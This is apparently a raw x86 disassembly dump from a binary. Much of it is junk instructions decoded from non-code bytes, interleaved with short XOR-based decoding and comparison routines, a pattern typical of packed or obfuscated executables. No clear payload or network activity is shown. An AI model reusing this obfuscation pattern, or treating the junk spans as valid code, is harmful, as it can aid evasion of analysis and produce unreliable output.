  41124d:	cwde   
  41124e:	or     BYTE PTR [edx+edi*4+0x78],bh
  411252:	xor    dl,dl
  411254:	test   BYTE PTR [ecx],dl
  411256:	aam    0x81
  411258:	mov    esi,edi
  41125a:	rcl    DWORD PTR [ecx+0x5eaa320a],cl
  411260:	retf   
  411261:	test   DWORD PTR [esp+ebp*8-0x74124ade],esi
  411268:	adc    ch,BYTE PTR [ebx]
  41126a:	in     eax,0x4f
  41126c:	cs jnp 0x4112d1
  41126f:	or     edx,eax
  411271:	icebp  
  411272:	sub    BYTE PTR [ecx-0x15],0x71
  411276:	out    0x39,eax
  411278:	in     al,dx
  411279:	leave  
  41127a:	push   esi
  41127b:	les    esi,FWORD PTR ds:0xeb0cf45c
  411281:	add    cl,al
  411283:	aaa    
  411284:	shl    ecx,cl
  411286:	cmp    al,0xab
  411288:	dec    esp
  411289:	out    0x7d,eax
  41128b:	xchg   esi,eax
  41128c:	push   es
  41128d:	adc    al,0x55
  41128f:	push   ecx
  411290:	jmp    0xa6c6:0x2c98d183
  411297:	mov    ds:0x626a307e,al
  41129c:	daa    
  41129d:	xchg   edi,eax
  41129e:	shr    BYTE PTR [ebx-0x63],1
  4112a1:	dec    edi
  4112a2:	clc    
  4112a3:	out    0x37,al
  4112a5:	or     al,0xaa
  4112a7:	scas   eax,DWORD PTR es:[edi]
  4112a8:	sar    BYTE PTR [eax+0x198c40f6],1
  4112ae:	popa   
  4112af:	pop    esi
  4112b0:	jle    0x411278
  4112b2:	jbe    0x411278
  4112b4:	cs cmc 
  4112b6:	adc    DWORD PTR [edi],ebp
  4112b8:	cmp    al,0x5d
  4112ba:	pop    edi
  4112bb:	in     eax,0xcb
  4112bd:	sbb    ah,ah
  4112bf:	(bad)  
  4112c0:	scas   al,BYTE PTR es:[edi]
  4112c1:	mov    ebx,0x2e2d0f1a
  4112c6:	push   0xca4c45a5
  4112cb:	aam    0x54
  4112cd:	pusha  
  4112ce:	push   0x7f9056ec
  4112d3:	xor    DWORD PTR [ebp+0x2f],ecx
  4112d6:	iret   
  4112d7:	push   edi
  4112d8:	rcr    DWORD PTR [ecx],1
  4112da:	add    cl,dl
  4112dc:	or     DWORD PTR [eax-0x1a],ecx
  4112df:	test   al,0x14
  4112e1:	push   esp
  4112e2:	sub    eax,0xe814c4e2
  4112e7:	mov    ch,0x7d
  4112e9:	pop    edi
  4112ea:	ss pop edx
  4112ec:	pop    ss
  4112ed:	push   esp
  4112ee:	sbb    edi,DWORD PTR [edi+0x6c]
  4112f1:	dec    eax
  4112f2:	mov    ah,bh
  4112f4:	add    ecx,eax
  4112f6:	pushf  
  4112f7:	std    
  4112f8:	mov    ds:0xd8ac3f97,eax
  4112fd:	mov    bl,0x5b
  4112ff:	inc    ebx
  411300:	push   ds
  411301:	dec    edi
  411302:	imul   ebx,DWORD PTR [edx-0x541617c2],0x93b60db1
  41130c:	add    al,BYTE PTR [edx]
  41130e:	xor    bl,0x17
  411311:	pop    ds
  411312:	mov    cl,0xce
  411314:	jns    0x4112db
  411316:	pop    edi
  411317:	push   ebp
  411318:	ja     0x411305
  41131a:	adc    dh,BYTE PTR [esi+0x18]
  41131d:	sahf   
  41131e:	and    eax,0x2ecf01c5
  411323:	xchg   ebp,eax
  411324:	wbinvd 
  411326:	sbb    DWORD PTR [ebp+esi*4+0x1e],0x61c60f59
  41132e:	add    bh,cl
  411330:	add    DWORD PTR ds:0x7e3ee3bd,ebp
  411336:	fisubr DWORD PTR [ebx+0x61]
  411339:	sub    dh,BYTE PTR [ebp-0x367b0e]
  41133f:	pusha  
  411340:	jb     0x41130a
  411342:	inc    ecx
  411343:	mov    edi,0x298c686f
  411348:	cmp    cl,BYTE PTR [ebp+0x32]
  41134b:	xchg   ebp,eax
  41134c:	aad    0x83
  41134e:	adc    DWORD PTR [ebp+0x23],edx
  411351:	mov    dl,0x0
  411353:	jp     0x411353
  411355:	ja     0x41136c
  411357:	jmp    0x178b:0x5f9eaf10
  41135e:	out    dx,al
  41135f:	sub    dh,BYTE PTR [edx+0x5a]
  411362:	jns    0x411316
  411364:	jmp    0x9ef0766c
  411369:	push   ss
  41136a:	dec    eax
  41136b:	sub    eax,0x1d8d20e9
  411370:	es in  al,dx
  411372:	nop
  411373:	rcr    BYTE PTR [ecx-0x22],0xd3
  411377:	mov    dh,0x4
  411379:	loopne 0x41130e
  41137b:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  41137f:	mov    edx,DWORD PTR [ebp+0xc]
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x68421fa1],ecx
  4113db:	icebp  
  4113dc:	add    DWORD PTR [eax+0x7e],eax
  4113df:	jle    0x4113d2
  4113e1:	jg     0x411461
  4113e3:	jle    0x4113b8
  4113e5:	xchg   ecx,eax
  4113e6:	lea    eax,[edx-0x3d]
  4113e9:	imul   ebx,DWORD PTR [edx],0xe686013d
  4113ef:	ja     0x41139c
  4113f1:	mov    dl,0x19
  4113f3:	cmp    bl,BYTE PTR [edi]
  4113f5:	mov    dh,0x4f
  4113f7:	sub    BYTE PTR [esi],al
  4113f9:	lea    ecx,[edx]
  4113fb:	js     0x4113d2
  4113fd:	leave  
  4113fe:	adc    cl,BYTE PTR [ebp+ebp*2+0x57c5633]
  411405:	mov    eax,0x24c61e5b
  41140a:	call   0xa04557f5
  41140f:	rcl    ebp,0xdc
  411412:	or     al,0xf2
  411414:	fcom   st(5)
  411416:	fwait
  411417:	addr16 mov ch,0x7f
  41141a:	jmp    0x411489
  41141c:	add    eax,0x618ef1de
  411421:	sbb    DWORD PTR [ebx+esi*4],0x47
  411425:	push   0x46
  411427:	pushf  
  411428:	cdq    
  411429:	push   ss
  41142a:	popf   
  41142b:	jge    0x4114a9
  41142d:	pop    edi
  41142e:	pop    edi
  41142f:	or     DWORD PTR [ebx+0x7139a7d5],edi
  411435:	jb     0x411403
  411437:	stc    
  411438:	imul   BYTE PTR [ebx]
  41143a:	test   DWORD PTR [ebp-0x2f],esi
  41143d:	imul   edi,DWORD PTR [eax+0x69],0xfffffff4
  411441:	and    eax,0x6f88cabd
  411446:	dec    ebp
  411447:	lods   eax,DWORD PTR ds:[esi]
  411448:	xchg   ecx,eax
  411449:	xchg   ebp,eax
  41144a:	mov    ch,0x56
  41144c:	sahf   
  41144d:	pop    ds
  41144e:	sbb    ch,ah
  411450:	xchg   esp,eax
  411451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411452:	dec    esp
  411453:	pusha  
  411454:	inc    edi
  411455:	es std 
  411457:	sub    BYTE PTR [ecx],ch
  411459:	jg     0x411476
  41145b:	sahf   
  41145c:	mov    DWORD PTR [ecx],edx
  41145e:	sbb    al,0xeb
  411460:	(bad)
  411463:	xchg   edi,eax
  411464:	mov    al,ds:0x360bb246
  411469:	aam    0x1
  41146b:	std    
  41146c:	jecxz  0x411487
  41146e:	xchg   esp,eax
  41146f:	imul   ecx,DWORD PTR [eax+0x38],0x48214f31
  411476:	sbb    bh,al
  411478:	jl     0x411458
  41147a:	or     DWORD PTR [ebp-0x3a0e61ce],eax
  411480:	mov    ds:0x582ba30,eax
  411485:	jnp    0x4114c9
  411487:	(bad)  
  411488:	gs iret 
  41148a:	jg     0x41149a
  41148c:	out    0x1e,al
  41148e:	lock push esp
  411490:	fcom   QWORD PTR [ebp+edi*2+0x4c23899a]
  411497:	sbb    DWORD PTR [ecx-0x27d05cec],0x506a0fd3
  4114a1:	retf   
  4114a2:	add    dl,BYTE PTR [eax+0x6c]
  4114a5:	inc    esi
  4114a6:	add    eax,0x2bca295f
  4114ab:	inc    edi
  4114ac:	inc    esi
  4114ad:	or     al,0x58
  4114af:	pushf  
  4114b0:	mov    ecx,0xd294771b
  4114b5:	aam    0x31
  4114b7:	jne    0x411500
  4114b9:	inc    ecx
  4114ba:	daa    
  4114bb:	sbb    al,BYTE PTR [esi-0x44720141]
  4114c1:	mov    al,BYTE PTR [ebp+0x3696dfc0]
  4114c7:	fimul  DWORD PTR [esi+0x27cec12c]
  4114cd:	jbe    0x411497
  4114cf:	xor    DWORD PTR [esi-0x28],edi
  4114d2:	cmp    edi,DWORD PTR [edi]
  4114d4:	(bad)  
  4114d5:	cmp    eax,0xe14e8f6e
  4114da:	aas    
  4114db:	pushf  
  4114dc:	push   ebp
  4114dd:	xchg   edx,eax
  4114de:	dec    ebx
  4114df:	(bad)  
  4114e0:	jbe    0x411479
  4114e2:	dec    ebp
  4114e3:	inc    esi
  4114e4:	xor    al,0xeb
  4114e6:	out    0x95,al
  4114e8:	pop    esi
  4114e9:	xchg   edi,eax
  4114ea:	imul   DWORD PTR [eax+ebp*4-0x8d720dc]
  4114f1:	xor    DWORD PTR [ebx+0x3f],edx
  4114f4:	int3   
  4114f5:	fisttp WORD PTR [edi-0x6326bf5c]
  4114fb:	or     ecx,DWORD PTR [esi]
  4114fd:	lock sub eax,0x6d070816
  411503:	dec    edx
  411504:	ficom  DWORD PTR [edi]
  411506:	js     0x411554
  411508:	xchg   esi,eax
  411509:	or     edx,DWORD PTR [eax-0x2bdd990f]
  41150f:	lahf   
  411510:	mov    al,ds:0x5c78dc0c
  411515:	push   ecx
  411516:	inc    esi
  411517:	test   al,0x8d
  411519:	pop    ecx
  41151a:	or     eax,0xcfbb1de2
  41151f:	cld    
  411520:	xor    al,0x4d
  411522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411523:	aad    0x1b
  411525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411526:	push   cs
  411527:	jle    0x41159f
  411529:	jno    0x411520
  41152b:	sub    DWORD PTR [edi-0x11],0xffffffae
  41152f:	and    BYTE PTR [ebp-0x57],bl
  411532:	add    DWORD PTR [edx+0x75f99d1b],esi
  411538:	sub    eax,0x2322ffe7
  41153d:	mov    ecx,0x72d5b2da
  411542:	shr    DWORD PTR [edi+0x5cf5306b],1
  411548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411549:	dec    ebx
  41154a:	cdq    
  41154b:	cmp    edi,DWORD PTR [ebx+0x2c]
  41154e:	fisub  DWORD PTR [edi-0x6436be99]
  411554:	mov    dl,0xae
  411556:	cmp    eax,0x5ca92818
  41155b:	stos   DWORD PTR es:[edi],eax
  41155c:	sub    bl,BYTE PTR [edx-0x70]
  41155f:	dec    edi
  411560:	dec    ebp
  411561:	or     edi,ebp
  411563:	inc    DWORD PTR [ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	addr16 xchg esp,eax
  411583:	xchg   DWORD PTR [edi+0x7e7e4180],esp
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x41155c
  41158e:	daa    
  41158f:	iret   
  411590:	xor    eax,0x41b82075
  411595:	mov    ch,al
  411597:	or     al,0x83
  411599:	xor    ecx,DWORD PTR [esi]
  41159b:	das    
  41159c:	add    DWORD PTR [eax],0x5369e369
  4115a2:	lahf   
  4115a3:	xor    ah,BYTE PTR [ebp-0x46]
  4115a6:	mov    ds:0xcdb1fba,eax
  4115ab:	xchg   esi,eax
  4115ac:	sbb    bl,0xe1
  4115af:	jnp    0x411584
  4115b1:	sbb    DWORD PTR cs:[ebp-0x2a],0xf0f7598d
  4115b9:	mov    ebx,0x211b312b
  4115be:	mov    dh,0x12
  4115c0:	mov    dh,dh
  4115c2:	nop
  4115c3:	jns    0x41157e
  4115c5:	out    dx,al
  4115c6:	out    0xc,eax
  4115c8:	sbb    dh,BYTE PTR [edx+eiz*2]
  4115cb:	cmp    al,0x16
  4115cd:	sub    edx,ecx
  4115cf:	ins    DWORD PTR es:[edi],dx
  4115d0:	mov    bh,0x36
  4115d2:	repnz push esi
  4115d4:	clc    
  4115d5:	repz ds cmp al,0xe4
  4115d9:	aad    0x5a
  4115db:	loop   0x4115d3
  4115dd:	shr    DWORD PTR [esi+ecx*4+0x5a],0xdf
  4115e2:	mov    esp,edx
  4115e4:	ret    0x4566
  4115e7:	sub    al,0xa3
  4115e9:	push   esp
  4115ea:	xchg   BYTE PTR ds:0x5badc7d6,dh
  4115f0:	mov    ecx,0x47367a96
  4115f5:	sahf   
  4115f6:	jne    0x4115f4
  4115f8:	ror    BYTE PTR [esi-0xa7f376d],0xe7
  4115ff:	cwde   
  411600:	out    dx,eax
  411601:	push   eax
  411602:	js     0x411643
  411604:	(bad)  
  411605:	xchg   edx,eax
  411606:	pop    esp
  411607:	mov    ebp,0x9f7d81d
  41160c:	mov    ecx,ecx
  41160e:	dec    ebp
  41160f:	ss push ebp
  411611:	nop
  411612:	adc    BYTE PTR [edx],0x59
  411615:	inc    ebp
  411616:	sahf   
  411617:	pop    ecx
  411618:	mov    eax,0x973490e0
  41161d:	retf   0xbddb
  411620:	adc    DWORD PTR [ebx],edx
  411622:	jle    0x41160c
  411624:	(bad)  
  411625:	stc    
  411626:	(bad)  
  411628:	jmp    esp
  41162a:	or     ch,BYTE PTR [ebp-0xcc36ac7]
  411630:	ret    
  411631:	cmp    al,0xa5
  411633:	xchg   BYTE PTR [esi],dh
  411635:	push   edi
  411636:	or     DWORD PTR [ebx-0x68],0x6c
  41163a:	mov    cl,BYTE PTR [edx-0x1397db70]
  411640:	hlt    
  411641:	repnz or esp,DWORD PTR [esi]
  411644:	jge    0x411631
  411646:	add    eax,0x65488209
  41164b:	pop    ecx
  41164c:	adc    bl,BYTE PTR [esi-0x68]
  41164f:	or     dl,BYTE PTR [ecx+0xd]
  411652:	call   0xb189f541
  411657:	ss jecxz 0x41169c
  41165a:	lds    edx,FWORD PTR ds:0x10a42ea6
  411660:	cwde   
  411661:	enter  0xa3c5,0x66
  411665:	ins    DWORD PTR es:[edi],dx
  411666:	and    dl,ch
  411668:	and    al,0x32
  41166a:	and    DWORD PTR [ebx+ebp*1-0x69],ecx
  41166e:	add    ch,BYTE PTR [ecx+0x2bb73380]
  411674:	arpl   WORD PTR [edi+0x54],bp
  411677:	icebp  
  411678:	pop    eax
  411679:	jge    0x4116ae
  41167b:	cdq    
  41167c:	dec    edi
  41167d:	ret    
  41167e:	aad    0xc9
  411680:	push   ds
  411681:	sbb    edi,eax
  411683:	gs cmc 
  411685:	inc    edx
  411686:	jge    0x411620
  411688:	fcom   DWORD PTR [edi-0x4b]
  41168b:	jl     0x411670
  41168d:	pop    ebp
  41168e:	enter  0x4e8f,0xb5
  411692:	and    BYTE PTR [edx-0x2cf81a24],bl
  411698:	fs popf 
  41169a:	(bad)  
  41169b:	and    ebx,DWORD PTR [esi]
  41169d:	dec    ebp
  41169e:	sub    ch,BYTE PTR [esi]
  4116a0:	(bad)  
  4116a1:	idiv   BYTE PTR [ebx-0x48677948]
  4116a7:	dec    eax
  4116a8:	fsubr  QWORD PTR [esi+0x3794fd9c]
  4116ae:	inc    edx
  4116af:	fucom  st(2)
  4116b1:	mov    ah,0x23
  4116b3:	fs jge 0x4116c7
  4116b6:	ss loope 0x41166d
  4116b9:	cmp    eax,0x4007baa5
  4116be:	ins    DWORD PTR es:[di],dx
  4116c0:	jne    0x4116ef
  4116c2:	mov    dl,0xfc
  4116c4:	mov    WORD PTR [ecx+0x52],gs
  4116c7:	jmp    0xf8df155b
  4116cc:	clc    
  4116cd:	mul    BYTE PTR [eax+edx*2-0x3cba28d]
  4116d4:	mov    BYTE PTR [esi-0x4],dh
  4116d7:	stc    
  4116d8:	pop    ds
  4116d9:	push   esi
  4116da:	jae    0x4116bc
  4116dc:	jb     0x4116e4
  4116de:	jle    0x411724
  4116e0:	xor    bl,BYTE PTR [ecx]
  4116e2:	jg     0x411757
  4116e4:	dec    ebp
  4116e5:	sub    DWORD PTR [eax+0x770d4671],0x3936210f
  4116ef:	icebp  
  4116f0:	cmp    DWORD PTR [edi+0x79],esp
  4116f3:	pop    ebp
  4116f4:	xor    ch,bh
  4116f6:	adc    al,0x4
  4116f8:	cli    
  4116f9:	sub    esi,DWORD PTR [esi-0x33871f5f]
  4116ff:	clc    
  411700:	gs xor al,0xdf
  411703:	mov    DWORD PTR [ebp-0x1207244c],esi
  411709:	adc    DWORD PTR [eax+0x104d8be7],ebp
  41170f:	add    eax,esi
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4336ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4336fb,0x4336c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433703,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43372b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4336bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x6ac45c29
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x41173d
  41178e:	or     eax,0xb528aca5
  411793:	inc    ecx
  411794:	bound  ebp,QWORD PTR [ecx]
  411796:	adc    dl,BYTE PTR [edi-0x68ec8eda]
  41179c:	aam    0x72
  41179e:	jnp    0x41177f
  4117a0:	fmul   st(2),st
  4117a2:	fincstp 
  4117a4:	ret    
  4117a5:	mov    eax,0x2c71960a
  4117aa:	bound  edi,QWORD PTR [ebp+eiz*2-0x1d]
  4117ae:	js     0x4117db
  4117b0:	je     0x411823
  4117b2:	ror    DWORD PTR [ebx],cl
  4117b4:	sti    
  4117b5:	xchg   BYTE PTR [ebp-0x4b8b5d4e],dl
  4117bb:	mov    al,ds:0x46e7df90
  4117c0:	push   ebp
  4117c1:	inc    esp
  4117c2:	mov    ds:0x3217ade0,al
  4117c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117c8:	jae    0x41183c
  4117ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117cb:	or     al,0x4
  4117cd:	jp     0x4117d6
  4117cf:	jo     0x41182f
  4117d1:	scas   eax,DWORD PTR es:[edi]
  4117d2:	ins    BYTE PTR es:[edi],dx
  4117d3:	retf   
  4117d4:	add    BYTE PTR [ecx-0x7d],dl
  4117d7:	jb     0x41178e
  4117d9:	ja     0x4117f2
  4117db:	or     bh,al
  4117dd:	jmp    0xc9242a87
  4117e2:	sub    BYTE PTR [edx-0x3dddda43],dl
  4117e8:	ret    
  4117e9:	jle    0x4117ba
  4117eb:	cwde   
  4117ec:	cmp    DWORD PTR [ecx-0x32],edx
  4117ef:	ja     0x411803
  4117f1:	pop    edi
  4117f2:	mov    cs,WORD PTR [edi-0x7b7da06]
  4117f8:	enter  0xd7dc,0x1d
  4117fc:	xlat   BYTE PTR ds:[ebx]
  4117fd:	jno    0x41181c
  4117ff:	mov    eax,ds:0x7e8f2790
  411804:	ret    
  411805:	cli    
  411806:	fsubr  QWORD PTR [esp+ebp*1]
  411809:	out    dx,eax
  41180a:	dec    ebp
  41180b:	mul    BYTE PTR [ebx+0x2c46346d]
  411811:	stos   DWORD PTR es:[edi],eax
  411812:	add    al,0x62
  411814:	and    eax,0x366fc3eb
  411819:	out    dx,eax
  41181a:	ficom  DWORD PTR [ecx]
  41181c:	in     al,0x8c
  41181e:	out    dx,al
  41181f:	pop    esp
  411820:	mov    dh,0xe1
  411822:	push   ds
  411823:	xchg   edx,eax
  411824:	and    al,0x7
  411826:	(bad)  
  411827:	jge    0x411804
  411829:	inc    eax
  41182a:	sti    
  41182b:	or     ecx,DWORD PTR [esi-0x519c7a13]
  411831:	popf   
  411832:	ret    0x4ee8
  411835:	mov    edi,0x40b4b579
  41183a:	enter  0xece0,0xc9
  41183e:	cdq    
  41183f:	sbb    BYTE PTR [edi-0x6edddd69],ch
  411845:	and    DWORD PTR [ebp+0x58],edx
  411848:	arpl   si,ax
  41184a:	cld    
  41184b:	cmp    eax,0x487a2dde
  411850:	cli    
  411851:	pop    edx
  411852:	pusha  
  411853:	add    ebx,DWORD PTR [ebp+0x73272751]
  411859:	push   ebp
  41185a:	and    BYTE PTR [ecx+0x37612406],ch
  411860:	mov    DWORD PTR [esi-0x3c02c371],ecx
  411866:	mov    esi,0xf2ae0e41
  41186b:	sub    DWORD PTR [esi+ebp*8+0x21],edi
  41186f:	dec    edx
  411870:	adc    dh,BYTE PTR [eax-0x4b]
  411873:	add    DWORD PTR [edi-0x58],esp
  411876:	das    
  411877:	loopne 0x411821
  411879:	je     0x41189e
  41187b:	xchg   BYTE PTR [esi],dl
  41187d:	mov    edx,0xe7dc73cb
  411882:	jnp    0x4118aa
  411884:	or     ebx,DWORD PTR [esi+eax*2+0x43e817ed]
  41188b:	repz jmp 0x4118b8
  41188e:	cmp    al,0x63
  411890:	and    BYTE PTR ds:0x27b974d6,dl
  411896:	bound  eax,QWORD PTR [ebx+0x2b]
  411899:	adc    DWORD PTR [edi],ebp
  41189b:	call   0x5e96c551
  4118a0:	retf   
  4118a1:	fcom   DWORD PTR [edx+ecx*1]
  4118a4:	pop    ecx
  4118a5:	jge    0x4118ac
  4118a7:	inc    eax
  4118a8:	int3   
  4118a9:	retf   
  4118aa:	pop    ebp
  4118ab:	pop    esi
  4118ac:	mov    ecx,0x38fd4af1
  4118b1:	mov    ds:0xee0dce6c,eax
  4118b6:	rcr    DWORD PTR [edi],1
  4118b8:	sbb    DWORD PTR [eax+edi*2-0xbc3eb6c],edx
  4118bf:	ds push ebp
  4118c1:	dec    eax
  4118c2:	popa   
  4118c3:	mov    DWORD PTR [ecx],esi
  4118c5:	jae    0x41184d
  4118c7:	and    ebx,edi
  4118c9:	xchg   dh,ch
  4118cb:	and    DWORD PTR [ebx-0x6c],0x1e
  4118cf:	cmp    BYTE PTR [eax-0x2f4c6e65],ch
  4118d5:	add    eax,0x50cc6d21
  4118da:	inc    ebp
  4118db:	sub    DWORD PTR [edi],edi
  4118dd:	pushf  
  4118de:	outs   dx,DWORD PTR ds:[esi]
  4118df:	pop    eax
  4118e0:	mov    ds:0xbb933e82,al
  4118e5:	sub    eax,0x17185abb
  4118ea:	aaa    
  4118eb:	sub    edi,DWORD PTR [edx+0x4cd1a044]
  4118f1:	mov    al,ds:0x8fd8e10
  4118f6:	dec    esp
  4118f7:	pop    ebp
  4118f8:	xor    eax,ecx
  4118fa:	cmp    edx,edx
  4118fc:	mov    esi,0x54d97a39
  411901:	imul   ebx,ebx,0x23
  411904:	int3   
  411905:	dec    ecx
  411906:	mov    DWORD PTR [edi],0x6268dc67
  41190c:	loope  0x41195b
  41190e:	inc    edi
  41190f:	sbb    eax,0x6821dc5d
  411914:	fnstcw WORD PTR [ebp+0x432009c9]
  41191a:	push   0x7fd24b5e
  41191f:	push   edi
  411920:	mov    ebp,0x2d19e1a8
  411925:	imul   eax,eax,0xfffffff5
  411928:	mov    eax,ds:0x266e260d
  41192d:	push   ds
  41192e:	cdq    
  41192f:	push   ebx
  411930:	dec    esi
  411931:	jns    0xae0be361
  411937:	mov    ebx,0x66aacee0
  41193c:	inc    ecx
  41193d:	inc    BYTE PTR [edx]
  41193f:	mov    al,ds:0x2d72bb86
  411944:	loopne 0x411985
  411946:	outs   dx,BYTE PTR ds:[esi]
  411947:	ret    0xb3c7
  41194a:	jb     0x41196b
  41194c:	mov    al,0x95
  41194e:	and    al,BYTE PTR [edi+0x14]
  411951:	or     al,0x88
  411953:	daa    
  411954:	lahf   
  411955:	mov    BYTE PTR [ebx+0x8589015],0x9f
  41195c:	sub    eax,0x7e2ebc52
  411961:	xor    DWORD PTR cs:[edx],ecx
  411964:	cmp    eax,0xadd19f57
  411969:	or     eax,0x62927f7d
  41196e:	mov    bl,0x51
  411970:	hlt    
  411971:	mov    esp,ebx
  411973:	rcl    DWORD PTR [edx],1
  411975:	loope  0x41192a
  411977:	or     dl,BYTE PTR [edx]
  411979:	push   edi
  41197a:	jl     0x41191f
  41197c:	cli    
  41197d:	and    DWORD PTR [ecx+0x44],esp
  411980:	outs   dx,BYTE PTR ds:[esi]
  411981:	mov    cl,0x5b
  411983:	xor    esp,ebx
  411985:	js     0x4119d4
  411987:	dec    esi
  411988:	retf   0x57d3
  41198b:	jmp    0x31bc90db
  411990:	sar    DWORD PTR [ecx+eax*4-0x17],cl
  411994:	and    ebp,DWORD PTR [eax+0x3e]
  411997:	dec    edi
  411998:	pop    ds
  411999:	les    ecx,FWORD PTR [edx+0x5796426a]
  41199f:	dec    BYTE PTR [ebp+ebp*2-0x3f]
  4119a3:	mov    ch,0xc6
  4119a5:	popa   
  4119a6:	mov    dh,0xf2
  4119a8:	pop    ds
  4119a9:	and    eax,0x3c4803fd
  4119ae:	or     DWORD PTR ds:0x433623,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433727,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433727
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433727,eax
  4119d6:	cmp    DWORD PTR ds:0x433727,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433727,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x74
  411a13:	dec    ebx
  411a14:	sbb    esp,DWORD PTR cs:0x107e7e4d
  411a1b:	jl     0x411a9b
  411a1d:	jle    0x411a2a
  411a1f:	and    edi,edx
  411a21:	mov    dl,0x32
  411a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a24:	ds loope 0x411a6f
  411a27:	xchg   ebx,eax
  411a28:	ss stos BYTE PTR es:[edi],al
  411a2a:	jmp    0xf193:0x2e95716
  411a31:	inc    esp
  411a32:	mov    cl,0xfe
  411a34:	mov    bl,0xfd
  411a36:	jmp    0x411a64
  411a38:	in     eax,0x5c
  411a3a:	or     eax,edi
  411a3c:	jge    0x411a50
  411a3e:	retf   
  411a3f:	in     eax,dx
  411a40:	sub    al,0xc
  411a42:	add    BYTE PTR [ebp+ebp*8+0x77689a88],0x62
  411a4a:	shl    ah,1
  411a4c:	cld    
  411a4d:	and    eax,0xa6eb652e
  411a52:	aad    0xab
  411a54:	push   esp
  411a55:	sub    eax,0x286b100
  411a5a:	mov    esp,0xdca39804
  411a5f:	iret   
  411a60:	mov    ch,0x66
  411a62:	popf   
  411a63:	hlt    
  411a64:	xchg   BYTE PTR [esi+0x6a],ch
  411a67:	adc    bh,BYTE PTR [ecx+0x52]
  411a6a:	mul    BYTE PTR [eax-0x1f]
  411a6d:	mov    esi,0x894262c5
  411a72:	xchg   ecx,eax
  411a73:	or     DWORD PTR [edi+0x71fcf109],edx
  411a79:	sub    eax,0xc6497e17
  411a7e:	pop    ebp
  411a7f:	test   eax,0x9b0a7c3b
  411a84:	xchg   edi,eax
  411a85:	nop
  411a86:	dec    ebx
  411a87:	and    eax,ebx
  411a89:	push   esp
  411a8a:	call   0x480aac9e
  411a8f:	add    esi,DWORD PTR [edx]
  411a91:	ins    DWORD PTR es:[edi],dx
  411a92:	aam    0xf0
  411a94:	mov    WORD PTR [ecx+0xf],fs
  411a97:	jmp    0x41d1:0x3d7d1e5c
  411a9e:	jnp    0x411a67
  411aa0:	push   edi
  411aa1:	cs leave 
  411aa3:	xor    BYTE PTR [edi],0x1a
  411aa6:	ins    BYTE PTR es:[edi],dx
  411aa7:	xor    eax,0x43c6e7ba
  411aac:	rol    al,cl
  411aae:	test   eax,0xcce4c62b
  411ab3:	pusha  
  411ab4:	jmp    0x411a95
  411ab6:	in     al,0xfe
